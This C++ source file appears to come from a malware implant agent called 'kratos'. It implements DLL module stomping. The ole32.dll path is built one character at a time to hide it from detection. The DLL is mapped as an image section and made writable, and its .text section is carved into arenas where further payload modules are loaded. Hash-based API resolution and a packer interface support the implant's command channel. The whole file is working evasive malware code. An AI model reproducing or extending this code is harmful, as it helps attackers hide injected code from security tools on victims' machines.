#include "modules/modules.h"
#include "agent/core.h"
#include "packager/packager.h"







BOOL Modules::LoadStompedDll() {
	CHAR path[30];
	path[  0 ] = 'C';
	path[  1 ] = ':';
	path[  2 ] = '\\';
	path[  3 ] = 'W';
	path[  4 ] = 'i';
	path[  5 ] = 'n';
	path[  6 ] = 'd';
	path[  7 ] = 'o';
	path[  8 ] = 'w';
	path[  9 ] = 's';
	path[ 10 ] = '\\';
	path[ 11 ] = 'S';
	path[ 12 ] = 'y';
	path[ 13 ] = 's';
	path[ 14 ] = 't';
	path[ 15 ] = 'e';
	path[ 16 ] = 'm';
	path[ 17 ] = '3';
	path[ 18 ] = '2';
	path[ 19 ] = '\\';
	path[ 20 ] = 'o';
	path[ 21 ] = 'l';
	path[ 22 ] = 'e';
	path[ 23 ] = '3';
	path[ 24 ] = '2';
	path[ 25 ] = '.';
	path[ 26 ] = 'd';
	path[ 27 ] = 'l';
	path[ 28 ] = 'l';
	path[ 29 ] = '\0';
	
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID pBase = NULL;
	SIZE_T ViewSize = 0;

	hFile = kratos->apis.CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( ! hFile || hFile == INVALID_HANDLE_VALUE ) { return FALSE; }
	DEBUG_LOG("[+] Opened File! ");


	NTSTATUS stat;
	stat = kratos->apis.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NTAPI_SUCCESS(stat)) {
		DEBUG_LOG("[+] Failed NtCreateSection");

		kratos->apis.CloseHandle(hFile);
		return FALSE;
	}
	DEBUG_LOG("[+] Created Section");


	stat = kratos->apis.NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &ViewSize, ViewShare, 0, PAGE_READONLY);
	if (!NTAPI_SUCCESS(stat)) {
		DEBUG_LOG("[+] Failed NtMapViewOfSection");

		kratos->apis.CloseHandle(hFile);
		kratos->apis.CloseHandle(hSection);
		return FALSE;
	}
	DEBUG_LOG("[+] Mapped Section");

	DWORD old;

	stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &pBase, &ViewSize, PAGE_READWRITE, &old);
	if (!NTAPI_SUCCESS(stat)) {
		DEBUG_LOG("[+] Failed NtProtect");

		kratos->apis.CloseHandle(hFile);
		kratos->apis.CloseHandle(hSection);
		return FALSE;
	}
	DEBUG_LOG("[+] Updated Mem Perms");


	SIZE_T TextSize = 0;

	if ( ! this->GetStompedDllText( pBase ) ) { return FALSE; }
	if ( ! this->CraftModuleStruct( ) ) { return FALSE; }
	this->IsStompedDllLoaded = TRUE;
	this->TextSectionIndex = StompedDllText;
	this->MappedOleBaseAddress = pBase;
	kratos->apis.CloseHandle(hFile);
	kratos->apis.CloseHandle(hSection);

	return TRUE;

}


BOOL Modules::GetStompedDllText(PVOID DllBase) {
	PIMAGE_SECTION_HEADER sec = SECTION_HEADER( DllBase );
	WORD NumberOfSections     = FILE_HEADER(DllBase)->NumberOfSections;
	BOOL Success = FALSE;
	for ( DWORD i = 0; i < NumberOfSections; i++ ) {
		if ( utils::mem::memcmp( sec[ i ].Name, ".text", 5 ) == 0 ) {
			this->StompedDllText = RVA2VA(PVOID, DllBase, sec[i].VirtualAddress);
			this->StompedDllTextSize = sec[i].Misc.VirtualSize;
			Success = TRUE;
			DEBUG_LOG("[+] Got .text");

		}
	}

	return Success;
}



PVOID Modules::ReserveArena(SIZE_T size) {
	SIZE_T need = PAGE_ALIGN(size);
	PVOID cur = this->TextSectionIndex;
	PVOID end = this->StompedDllText + this->StompedDllTextSize;

	if (!cur || need == 0 || cur + need > end) {
		return NULL;
	}

	this->TextSectionIndex = cur + need;
	return cur;
}



ModuleInformation* Modules::FindFreeModInfo() {
	for (INT i = 0;i < MAX_MODULES; i++) {
		if (this->ModuleInfos[i].EntryPoint == NULL) {
			return &this->ModuleInfos[i];
		}
	}
	return NULL;
}

ModuleInformation* Modules::FindModInfoEntry(INT32 needed) {
	for (INT i = 0; i < MAX_MODULES; i++) {
		if (this->ModuleInfos[i].EntryPoint != NULL && this->ModuleInfos[i].id == needed) {
			return &this->ModuleInfos[i];
		}
	}
	return NULL;
}


void Modules::Cleanup() {
	if ( this->ModuleStruct ) {
		kratos->apis.LocalFree( this->ModuleStruct );
		this->ModuleStruct = NULL;
	}

	if ( this->MappedOleBaseAddress && kratos->apis.NtUnmapViewOfSection ) {
		kratos->apis.NtUnmapViewOfSection( GetCurrentProcess( ), this->MappedOleBaseAddress );
		this->MappedOleBaseAddress = NULL;
	}

	this->LoadModulesBitMap = 0;
	Modules* self = this;
	modules = NULL;
	kratos->apis.LocalFree( self );
}



// functions for ModuleStruct, just forwards
INT32 UnPack4() {
	return packager->UnPack4( );
}

PBYTE UnPackBytes( INT32 Length ) {
	return packager->UnPackBytes( Length );
}

void Pack4(INT32 Val) {
	packager->Pack4( Val );
}

void Pack8( INT64 Val ) {
	packager->Pack8( Val );
}

void PackBytes(PBYTE data, INT32 len) {
	packager->PackBytes( data, len );
}

FARPROC GetAddress(HMODULE dll, DWORD hash) {
	return api::GetProcAddress(dll, hash);
}

HMODULE GetModuleByHahs(DWORD hash) {
	return api::GetModule(hash);
}

HLOCAL Allocate(SIZE_T n) {
	return kratos->apis.LocalAlloc(ALLOC_ARGS, n);
}

HLOCAL Free(HLOCAL mem) {
	return kratos->apis.LocalFree(mem);
}



BOOL Modules::CraftModuleStruct() {
	this->ModuleStruct = (PModule)kratos->apis.LocalAlloc(ALLOC_ARGS, sizeof(Module));
	if ( ! this->ModuleStruct) { return FALSE; }

	this->ModuleStruct->ModuleUnpack4        = UnPack4;
	this->ModuleStruct->ModuleUnpackBytes    = UnPackBytes;
	this->ModuleStruct->ModulePack4          = Pack4;
	this->ModuleStruct->ModulePack8          = Pack8;
	this->ModuleStruct->ModulePackBytes      = PackBytes;
	this->ModuleStruct->ModuleGetProcAddress = GetAddress;
	this->ModuleStruct->ModuleGetModule      = GetModuleByHahs;
	this->ModuleStruct->ModuleAllocate       = Allocate;
	this->ModuleStruct->ModuleFreeMem        = Free;

	return TRUE;
}






